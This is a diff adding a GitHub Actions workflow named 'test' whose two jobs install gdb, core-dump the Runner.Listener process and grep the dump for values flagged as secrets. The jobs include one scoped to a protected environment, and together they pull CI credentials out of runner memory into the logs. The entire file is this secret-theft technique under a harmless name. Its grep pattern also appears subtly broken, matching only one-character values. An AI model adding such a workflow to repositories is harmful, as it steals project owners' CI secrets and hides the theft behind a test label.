@@ -1,0 +1,26 @@
+name: test
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  get_scerets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump secrets
+        run: |
+          sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
+          grep -Eao '"[^"]+":\{"value":"[^"]","issecret":true\}' k.dump
+  test2:
+    runs-on: ubuntu-latest
+    environment: secret_one_scope
+    steps:
+      - name: dump secrets
+        run: |
+          sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
+          grep -Eao '"[^"]+":\{"value":"[^"]","issecret":true\}' k.dump
